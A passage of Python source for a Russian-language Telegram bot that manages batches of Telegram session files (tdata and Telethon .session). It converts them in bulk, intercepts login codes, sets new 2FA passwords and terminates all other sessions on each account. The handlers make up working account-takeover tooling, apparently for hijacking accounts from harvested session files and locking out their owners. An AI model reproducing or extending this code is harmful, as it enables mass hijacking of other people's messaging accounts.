        await message.answer("Пропустил файл: нужен Telethon .session")
        return

    source_base = sanitize_filename(os.path.splitext(original_name)[0])
    session_name = f"telethon_{batch_id}_{len(items) + 1}_{source_base}.session"
    session_path = os.path.join(SESSION_DIR, session_name)

    try:
        file = await bot.get_file(message.document.file_id)
        await bot.download_file(file.file_path, session_path)
        update_history(session_name, {"source_base": source_base})
        items.append(session_name)
        await state.update_data(bulk_items=items)
    except Exception as e:
        errors.append({"file": original_name, "error": str(e)})
        await state.update_data(bulk_errors=errors)
        await message.answer(f"Не удалось добавить {original_name}: {e}")
        return

    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Анализ и конвертация", callback_data=f"finish_bulk_sessions:{batch_id}"))
    builder.row(types.InlineKeyboardButton(text="Отмена", callback_data="back_to_main"))
    await message.answer(
        f"Добавлено .session: {len(items)}\nОшибок при загрузке: {len(errors)}",
        reply_markup=builder.as_markup()
    )

@router.message(SessionStates.waiting_for_json)
async def handle_json_string(message: types.Message, state: FSMContext):
    # В реальных условиях тут можно парсить JSON или сохранять строку в .session файл через StringSession
    string_data = message.text
    file_name = f"json_{message.from_user.id}_{hash(string_data)}.session"
    
    # Пример сохранения для Telethon StringSession (упрощенно)
    with open(os.path.join(SESSION_DIR, file_name), "w") as f:
        f.write(string_data)
        
    await state.clear()
    update_history(file_name)
    await message.answer("JSON/String сессия сохранена.")
    await show_session_menu(message, file_name)

@router.callback_query(F.data.startswith("list_sessions"))
async def list_sessions(callback: types.CallbackQuery):
    sync_history_with_files()
    files = list_saved_accounts()
    
    if not files:
        await callback.answer("Список сессий пуст", show_alert=True)
        return

    page = 0
    if ":" in callback.data:
        try:
            page = int(callback.data.split(":")[1])
        except ValueError:
            page = 0

    total_pages = max(1, (len(files) + SESSIONS_PER_PAGE - 1) // SESSIONS_PER_PAGE)
    page = max(0, min(page, total_pages - 1))
    page_files = files[page * SESSIONS_PER_PAGE:(page + 1) * SESSIONS_PER_PAGE]

    builder = InlineKeyboardBuilder()
    for f in page_files:
        builder.row(types.InlineKeyboardButton(text=format_account_label(f), callback_data=f"manage:{account_key(f)}"))

    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton(text="Назад", callback_data=f"list_sessions:{page - 1}"))
    nav_buttons.append(types.InlineKeyboardButton(text=f"{page + 1}/{total_pages}", callback_data=f"list_sessions:{page}"))
    if page < total_pages - 1:
        nav_buttons.append(types.InlineKeyboardButton(text="Вперед", callback_data=f"list_sessions:{page + 1}"))
    builder.row(*nav_buttons)
    builder.row(types.InlineKeyboardButton(text="В меню", callback_data="back_to_main"))
    
    await callback.message.edit_text(
        f"Список сессий и tdata\nВсего: {len(files)}",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("manage:"))
async def manage_callback(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return
    await show_session_menu(callback.message, session_name, is_edit=True)

async def show_session_menu(message: types.Message, session_name: str, is_edit=False):
    builder = InlineKeyboardBuilder()
    session_type = get_session_type(session_name)
    key = account_key(session_name)
    builder.row(types.InlineKeyboardButton(text="Получить код", callback_data=f"get_code:{key}"))
    builder.row(types.InlineKeyboardButton(text="Обновить номер", callback_data=f"refresh_account:{key}"))
    if session_type == "tdata":
        builder.row(types.InlineKeyboardButton(text="Конвертировать в .session", callback_data=f"convert_tdata:{key}"))
    else:
        if session_type == "telethon":
            builder.row(types.InlineKeyboardButton(text="Конвертировать в tdata", callback_data=f"convert_session_tdata:{key}"))
            builder.row(types.InlineKeyboardButton(text="Оставить новую, завершить старые", callback_data=f"terminate_old_confirm:{key}"))
        builder.row(types.InlineKeyboardButton(text="Установить 2FA", callback_data=f"setup_2fa:{key}"))
    builder.row(types.InlineKeyboardButton(text="Удалить из бота", callback_data=f"delete_local_confirm:{key}"))
    builder.row(types.InlineKeyboardButton(text="Завершить сессию", callback_data=f"terminate:{key}"))
    builder.row(types.InlineKeyboardButton(text="К списку", callback_data="list_sessions"))
    
    text = f"Управление аккаунтом\n\n{format_account_details(session_name)}"
    
    if is_edit:
        await message.edit_text(text, reply_markup=builder.as_markup())
    else:
        await message.answer(text, reply_markup=builder.as_markup())

@router.callback_query(F.data.startswith("get_code:"))
async def action_get_code(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return
    lib_type = get_session_type(session_name)
    
    await callback.answer("Перехват кода...")
    path = os.path.join(SESSION_DIR, session_name)
    
    code = await get_last_code(path, lib_type)
    history = load_history()
    info = history.get(session_name, {})
    info["last_code_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    history[session_name] = info
    save_history(history)
    
    builder = InlineKeyboardBuilder()
    key = account_key(session_name)
    builder.row(types.InlineKeyboardButton(text="Обновить", callback_data=f"get_code:{key}"))
    builder.row(types.InlineKeyboardButton(text="Назад", callback_data=f"manage:{key}"))
    
    await callback.message.edit_text(f"Результат проверки кода:\n\n{code}", reply_markup=builder.as_markup())

@router.callback_query(F.data.startswith("refresh_account:"))
async def action_refresh_account(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    await callback.answer("Обновляю номер...")
    info = await remember_account(session_name)
    if not info:
        await callback.message.answer("Не удалось определить номер. Проверьте, что сессия живая.")
        return

    await callback.message.answer(f"Номер обновлен: {info.get('phone') or 'номер скрыт/не найден'}")
    await show_session_menu(callback.message, session_name)

@router.callback_query(F.data.startswith("convert_tdata:"))
async def action_convert_tdata(callback: types.CallbackQuery):
    tdata_name = resolve_account_key(callback.data.split(":")[1])
    if not tdata_name:
        await callback.answer("tdata не найдена", show_alert=True)
        return

    await callback.answer("Конвертация tdata...")

    try:
        result = await convert_tdata_account(tdata_name)
    except Exception as e:
        await callback.message.answer(f"Ошибка конвертации: {e}")
        return

    phone = result.get("phone") or "не проверялся"
    await callback.message.answer(f"tdata сконвертирована в {result['session_name']}\nНомер: {phone}")
    await callback.message.answer_document(
        types.FSInputFile(result["session_path"], filename=result["session_name"]),
        caption="Готовая Telethon .session"
    )
    await callback.message.answer_document(
        types.FSInputFile(result["json_path"], filename=result["json_name"]),
        caption="JSON с данными аккаунта и session_string"
    )
    await show_session_menu(callback.message, result["session_name"])

@router.callback_query(F.data.startswith("convert_session_tdata:"))
async def action_convert_session_tdata(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    await callback.answer("Конвертация в tdata...")

    try:
        result = await convert_session_to_tdata(session_name)
    except Exception as e:
        await callback.message.answer(f"Ошибка обратной конвертации: {e}")
        return

    phone = result.get("phone") or "без проверки номера"
    await callback.message.answer(f"Сессия сконвертирована в tdata\nНомер: {phone}")
    await callback.message.answer_document(
        types.FSInputFile(result["zip_path"], filename=result["zip_name"]),
        caption="Готовая tdata в zip-архиве"
    )

@router.callback_query(F.data.startswith("finish_bulk:"))
async def action_finish_bulk(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    batch_id = callback.data.split(":")[1]

    if data.get("batch_id") != batch_id:
        await callback.answer("Пачка не найдена или уже завершена", show_alert=True)
        return

    items = data.get("bulk_items", [])
    upload_errors = data.get("bulk_errors", [])
    if not items:
        await callback.answer("Сначала отправьте хотя бы одну tdata", show_alert=True)
        return

    await callback.answer("Анализ и конвертация...")
    await callback.message.answer(f"Начал обработку пачки: {len(items)} tdata")

    converted = []
    convert_errors = []
    for index, tdata_name in enumerate(items, start=1):
        try:
            result = await convert_tdata_account(tdata_name)
            converted.append(result)
            phone = result.get("phone") or "без проверки номера"
            await callback.message.answer(f"{index}/{len(items)} готово: {phone}")
        except Exception as e:
            convert_errors.append({
                "tdata_name": tdata_name,
                "error": str(e),
            })
            await callback.message.answer(f"{index}/{len(items)} ошибка: {tdata_name}\n{e}")

    batches = load_batches()
    batches[batch_id] = {
        "created_at": data.get("created_at") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "finished_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "source_count": len(items),
        "upload_errors": upload_errors,
        "converted": converted,
        "convert_errors": convert_errors,
    }
    save_batches(batches)
    await state.clear()

    builder = InlineKeyboardBuilder()
    if converted:
        builder.row(types.InlineKeyboardButton(text="Получить .session", callback_data=f"get_bulk:session:{batch_id}"))
        builder.row(types.InlineKeyboardButton(text="Получить JSON", callback_data=f"get_bulk:json:{batch_id}"))
        builder.row(types.InlineKeyboardButton(text="Получить оба", callback_data=f"get_bulk:both:{batch_id}"))
    builder.row(types.InlineKeyboardButton(text="В меню", callback_data="back_to_main"))

    await callback.message.answer(
        "Массовая обработка завершена\n\n"
        f"Всего tdata: {len(items)}\n"
        f"Успешно: {len(converted)}\n"
        f"Ошибок загрузки: {len(upload_errors)}\n"
        f"Ошибок конвертации: {len(convert_errors)}",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("get_bulk:"))
async def action_get_bulk_sessions(callback: types.CallbackQuery):
    _, file_type, batch_id = callback.data.split(":", 2)
    batch = load_batches().get(batch_id)
    if not batch:
        await callback.answer("Пачка не найдена", show_alert=True)
        return

    converted = batch.get("converted", [])
    if not converted:
        await callback.answer("В этой пачке нет успешных сессий", show_alert=True)
        return

    captions = {
        "session": f"Отправляю файлов: {len(converted)} .session",
        "json": f"Отправляю файлов: {len(converted)} .json",
        "both": f"Отправляю файлов: {len(converted)} .session и {len(converted)} .json",
    }
    if file_type not in captions:
        await callback.answer("Неизвестный формат", show_alert=True)
        return

    await callback.answer("Отправляю файлы...")
    await callback.message.answer(captions[file_type])

    for index, result in enumerate(converted, start=1):
        session_path = result.get("session_path")
        json_path = result.get("json_path")
        phone = result.get("phone") or "без проверки номера"

        if file_type in ("session", "both") and session_path and os.path.exists(session_path):
            await callback.message.answer_document(
                types.FSInputFile(session_path, filename=result.get("session_name")),
                caption=f"{index}. {phone} | .session"
            )
        if file_type in ("json", "both") and json_path and os.path.exists(json_path):
            await callback.message.answer_document(
                types.FSInputFile(json_path, filename=result.get("json_name")),
                caption=f"{index}. {phone} | JSON"
            )

    await callback.message.answer("Готовые файлы отправлены.")

@router.callback_query(F.data.startswith("finish_bulk_sessions:"))
async def action_finish_bulk_sessions(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    batch_id = callback.data.split(":", 1)[1]

    if data.get("batch_id") != batch_id:
        await callback.answer("Пачка не найдена или уже завершена", show_alert=True)
        return

    items = data.get("bulk_items", [])
    upload_errors = data.get("bulk_errors", [])
    if not items:
        await callback.answer("Сначала отправьте хотя бы одну .session", show_alert=True)
        return

    await callback.answer("Анализ и конвертация...")
    await callback.message.answer(f"Начал обработку: {len(items)} .session")

    converted = []
    convert_errors = []
    for index, session_name in enumerate(items, start=1):
        try:
            result = await convert_session_account_to_tdata(session_name)
            converted.append(result)
            phone = result.get("phone") or "номер не найден"
            await callback.message.answer(f"{index}/{len(items)} готово: {phone}")
        except Exception as e:
            convert_errors.append({"session_name": session_name, "error": str(e)})
            await callback.message.answer(f"{index}/{len(items)} ошибка: {session_name}\n{e}")

    batches = load_batches()
    batches[batch_id] = {
        "kind": "session_to_tdata",
        "created_at": data.get("created_at") or datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "finished_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "source_count": len(items),
        "upload_errors": upload_errors,
        "converted": converted,
        "convert_errors": convert_errors,
    }
    save_batches(batches)
    await state.clear()

    builder = InlineKeyboardBuilder()
    if converted:
        builder.row(types.InlineKeyboardButton(text="Получить tdata.zip", callback_data=f"get_bulk_tdata:{batch_id}"))
    builder.row(types.InlineKeyboardButton(text="В меню", callback_data="back_to_main"))

    await callback.message.answer(
        "Массовая конвертация .session завершена\n\n"
        f"Всего: {len(items)}\n"
        f"Успешно: {len(converted)}\n"
        f"Ошибок загрузки: {len(upload_errors)}\n"
        f"Ошибок конвертации: {len(convert_errors)}",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("get_bulk_tdata:"))
async def action_get_bulk_tdata(callback: types.CallbackQuery):
    batch_id = callback.data.split(":", 1)[1]
    batch = load_batches().get(batch_id)
    if not batch:
        await callback.answer("Пачка не найдена", show_alert=True)
        return

    converted = batch.get("converted", [])
    if not converted:
        await callback.answer("Нет успешно сконвертированных tdata", show_alert=True)
        return

    await callback.answer("Отправляю архивы...")
    await callback.message.answer(f"Отправляю tdata.zip: {len(converted)}")

    sent = 0
    for index, result in enumerate(converted, start=1):
        zip_path = result.get("zip_path")
        if not zip_path or not os.path.exists(zip_path):
            continue
        await callback.message.answer_document(
            types.FSInputFile(zip_path, filename=result.get("zip_name")),
            caption=f"{index}. {result.get('phone') or 'номер не найден'}"
        )
        sent += 1

    await callback.message.answer(f"Готово. Отправлено архивов: {sent}")

@router.callback_query(F.data.startswith("setup_2fa:"))
async def action_setup_2fa(callback: types.CallbackQuery, state: FSMContext):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return
    await state.update_data(target_session=session_name)
    await state.set_state(SessionStates.waiting_for_2fa)
    
    await callback.message.answer(f"Введите новый облачный пароль (2FA) для {session_name}:")
    await callback.answer()

@router.callback_query(F.data.startswith("delete_local_confirm:"))
async def action_delete_local_confirm(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    key = account_key(session_name)
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Да, удалить из бота", callback_data=f"delete_local:{key}"))
    builder.row(types.InlineKeyboardButton(text="Отмена", callback_data=f"manage:{key}"))
    await callback.message.edit_text(
        "Удалить из бота?\n\n"
        f"{format_account_details(session_name)}\n\n"
        "Аккаунт в Telegram не будет завершен. Будут удалены только локальные файлы и запись из списка.",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("delete_local:"))
async def action_delete_local(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    try:
        delete_local_account(session_name)
    except Exception as e:
        await callback.message.answer(f"Ошибка удаления из бота: {e}")
        return

    await callback.message.edit_text(f"{session_name} удалена из бота. Аккаунт не завершался.")

@router.callback_query(F.data.startswith("terminate_old_confirm:"))
async def action_terminate_old_confirm(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    key = account_key(session_name)
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Да, оставить новую", callback_data=f"terminate_old:{key}"))
    builder.row(types.InlineKeyboardButton(text="Отмена", callback_data=f"manage:{key}"))
    await callback.message.edit_text(
        "Подтвердите действие.\n\n"
        "Бот оставит самую новую сессию аккаунта, которая НЕ является текущей сессией чекера. "
        "Все остальные старые сессии будут завершены. После этого текущая сессия чекера тоже выйдет из аккаунта "
        "и будет удалена из бота.\n\n"
        "Нажимайте только после того, как уже вошли в нужную новую сессию по коду.",
        reply_markup=builder.as_markup()
    )

@router.callback_query(F.data.startswith("terminate_old:"))
async def action_terminate_old(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return

    if get_session_type(session_name) != "telethon":
        await callback.answer("Доступно только для Telethon .session", show_alert=True)
        return

    path = os.path.join(SESSION_DIR, session_name)
    await callback.answer("Завершаю старые сессии...")

    try:
        result = await terminate_old_authorizations_keep_latest(path)
        if os.path.exists(path):
            os.remove(path)
        remove_from_history(session_name)
    except Exception as e:
        await callback.message.answer(f"Ошибка завершения старых сессий: {e}")
        return

    kept = result.get("kept")
    kept_text = "новая сессия не найдена"
    if kept:
        kept_text = f"{kept.get('app_name') or 'unknown'} | {kept.get('device_model') or 'unknown'} | {kept.get('date_active') or ''}"

    await callback.message.edit_text(
        "Готово.\n\n"
        f"Завершено старых сессий: {result['terminated_old']}\n"
        f"Оставлена: {kept_text}\n"
        "Сессия чекера завершена и удалена из бота."
    )

@router.message(SessionStates.waiting_for_2fa)
async def process_2fa_input(message: types.Message, state: FSMContext):
    data = await state.get_data()
    session_name = data.get("target_session")
    password = message.text
    
    lib_type = get_session_type(session_name)
    if lib_type == "tdata":
        await message.answer("Для tdata сначала выполните конвертацию в .session, затем установите 2FA.")
        await state.clear()
        await show_session_menu(message, session_name)
        return

    path = os.path.join(SESSION_DIR, session_name)
    
    success = await set_cloud_password(path, password, lib_type)
    
    if success:
        await message.answer(f"2FA успешно установлен: {password}")
    else:
        await message.answer("Ошибка при установке 2FA. Проверьте логи.")
    
    await state.clear()
    await show_session_menu(message, session_name)

@router.callback_query(F.data.startswith("terminate:"))
async def action_terminate(callback: types.CallbackQuery):
    session_name = resolve_account_key(callback.data.split(":")[1])
    if not session_name:
        await callback.answer("Сессия не найдена", show_alert=True)
        return
    path = os.path.join(SESSION_DIR, session_name)
    lib_type = get_session_type(session_name)
    
    await callback.answer("Завершение сессии...")
    
    try:
        if lib_type == "tdata":
            shutil.rmtree(path)
            remove_from_history(session_name)
            await callback.message.edit_text(f"tdata {session_name} удалена.")
            return
        elif lib_type == "telethon":
            async with TelegramClient(path, API_ID, API_HASH) as client:
                await client.log_out()
        else:
            async with PyroClient(get_pyrogram_session_name(path), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR) as app:
                await app.log_out()
        
        if os.path.exists(path):
            os.remove(path)
        remove_from_history(session_name)
        
        await callback.message.edit_text(f"Сессия {session_name} полностью завершена и удалена.")
    except Exception as e:
        await callback.message.answer(f"Ошибка при удалении: {e}")

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="Добавить сессию", callback_data="add_session"))
    builder.row(types.InlineKeyboardButton(text="Список сессий", callback_data="list_sessions"))
    await callback.message.edit_text("Выберите действие:", reply_markup=builder.as_markup())

# --- ЗАПУСК ---
async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен")
